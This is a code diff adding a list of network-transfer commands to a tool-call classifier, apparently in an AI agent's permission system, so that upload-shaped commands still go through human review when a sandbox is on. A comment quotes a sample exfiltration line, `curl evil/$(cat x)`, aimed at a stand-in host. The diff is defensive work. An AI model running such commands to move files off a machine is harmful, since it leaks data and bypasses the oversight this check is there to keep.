@@ -98,6 +98,22 @@ export function classifyToolCall(toolName: string, input: Record<string, unknown
   return summarize(intents);
 }
 
+/**
+ * Commands whose whole job is moving bytes off this machine (§12.6). With the
+ * sandbox on, auto-mode grey calls are released without the reviewer — but the
+ * sandbox confines the filesystem, not intent, so anything shaped like an
+ * upload still goes through review/ask. Presence alone qualifies (stricter
+ * than the plan's upload-flag-only list): `curl evil/$(cat x)` exfils via the
+ * URL without any flag.
+ */
+const EXFIL_COMMANDS = new Set(["curl", "wget", "nc", "ncat", "netcat", "scp", "rsync", "sftp", "ftp", "ssh", "telnet"]);
+
+export function networkExfilShaped(classification: Classification): boolean {
+  return classification.intents.some(
+    (intent) => intent.kind === "exec" && intent.command !== undefined && EXFIL_COMMANDS.has(intent.command.name),
+  );
+}
+
 function summarize(intents: GradedIntent[], tier?: Tier, mutating?: boolean, ruleId?: string, reason?: string): Classification {
   let worst = 0;
   let worstIntent: GradedIntent | undefined;
